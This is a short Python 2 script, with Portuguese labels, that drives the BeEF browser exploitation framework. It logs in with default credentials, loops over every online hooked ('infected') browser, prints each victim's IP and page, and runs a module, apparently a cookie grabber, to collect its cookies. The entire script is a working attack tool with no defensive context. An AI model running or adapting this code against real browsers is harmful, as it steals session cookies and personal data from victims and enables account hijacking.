from beefapi import BeefAPI

beef = BeefAPI({})
beef.login("beef", "beef")

for browser_infectado in beef.hooked_browsers.online:
    print "*" * 30
    print "Vitima ->", browser_infectado.ip
    print "Dominio ->", browser_infectado.page_uri
    print "Cookies ->"

    ID = browser_infectado.run(234)["command_id"]
    sessao = browser_infectado.session
    resultado = beef.modules.findbyid(234).results(sessao, ID)
    while not resultado:
        resultado = beef.modules.findbyid(234).results(sessao, ID)
    print resultado